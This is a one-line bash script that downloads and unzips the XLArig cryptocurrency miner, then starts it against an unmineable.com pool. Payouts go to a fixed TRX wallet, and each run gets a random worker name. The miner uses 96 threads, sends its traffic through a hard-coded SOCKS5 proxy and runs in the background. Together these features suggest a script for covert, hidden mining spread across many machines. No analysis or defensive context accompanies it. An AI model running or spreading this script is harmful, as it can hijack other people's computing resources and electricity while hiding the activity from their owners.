#!/usr/bin/env bash
wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o rx-us.unmineable.com:3333 -u TRX:TJ64St91EUFbaDg3T2zKq8iYZ4MSk88vBU.$(echo $(shuf -i 1-99999 -n 1)-bismillah) -k -t96  -x socks5://172.105.85.90:1080 -B
